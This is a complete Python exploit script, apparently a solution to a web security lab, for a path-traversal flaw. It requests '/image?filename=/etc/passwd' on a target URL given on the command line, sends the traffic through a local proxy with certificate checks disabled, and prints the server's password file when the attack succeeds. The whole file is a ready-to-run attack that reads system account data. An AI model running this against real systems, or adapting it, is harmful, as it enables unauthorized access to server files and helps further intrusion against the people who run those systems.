import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8081','https':'http://127.0.0.1:8081'}

def path_transversal(url):
    path="/image?filename=/etc/passwd"
    r=requests.get(url+path,proxies=proxies,verify=False)
    if "root:x" in r.text:
        print("(+) Exploit Successfull.")
        print("[+] Printing the contents of /etc/passwd")
        print(r.text)
        sys.exit(0)
    else:
        print("[-] Exploit Failed.")
        sys.exit(-1)

def main():
    if len(sys.argv)!=2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s http://evil.com" % sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1].rstrip('/')
    path_transversal(url)

if __name__=="__main__":
    main()